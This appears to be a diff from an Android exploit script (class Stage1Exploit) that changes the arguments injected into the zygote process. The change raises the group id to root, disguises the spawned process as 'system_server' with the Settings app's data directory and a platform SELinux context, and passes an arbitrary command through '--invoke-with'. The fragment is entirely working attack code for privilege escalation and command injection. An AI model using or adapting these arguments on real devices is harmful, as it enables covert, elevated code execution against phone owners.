@@ -190,13 +190,13 @@ class Stage1Exploit:
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
             "--setuid=1000",
-            "--setgid=1000",
+            "--setgid=0",
             "--setgroups=3003",
             "--target-sdk-version=28",
-            "--nice-name=com.qualcomm.qti.qms.service.trustzoneaccess",
-            "--app-data-dir=/data/user/0/com.qualcomm.qti.qms.service.trustzoneaccess",
+            "--nice-name=system_server",
+            "--app-data-dir=/data/user/0/com.android.settings",
             "--runtime-args",
-            "--seinfo=ssgapp:ssg_app:complete",
+            "--seinfo=platform:system_app:complete",
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
